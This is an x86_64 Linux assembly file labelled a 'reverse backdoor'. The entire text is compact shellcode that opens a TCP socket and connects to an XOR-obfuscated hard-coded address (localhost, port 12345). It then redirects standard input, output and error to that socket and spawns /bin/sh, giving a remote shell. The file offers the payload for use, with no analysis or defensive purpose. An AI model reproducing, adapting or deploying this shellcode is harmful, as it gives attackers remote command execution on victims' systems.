;;; Coded by MMxM (@hc0d3r)
;;; reverse backdoor linux x86_64

section .text
	global _start
_start:
	;;; socket

	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	mov al, 41
	inc si
	mov dil, 2
	syscall

	;;; connect

	mov rsi, 0x0106667F3930ff02
	push rsi

	xor byte [rsp+1], 0xff
	xor word [rsp+5], 0x0666

	mov rsi, rsp
	mov rdi, rax

	mov al, 42
	mov dl, 16

	syscall

	;;; dup2

	xor rax, rax

	mov al, 33
	xor rsi, rsi

	syscall

	mov al, 33
	inc rsi
	syscall

	mov al, 33
	inc rsi
	syscall

	;;; execve("/bin/sh", ["/bin/sh"], [0])

	xor rdx, rdx

	mov al, 59

	mov rdi, 0x68732f6e69622f66
	shr rdi, 8

	push rdi

	mov rdi, rsp

	push rdx
	push rdi

	mov rsi, rsp

	syscall
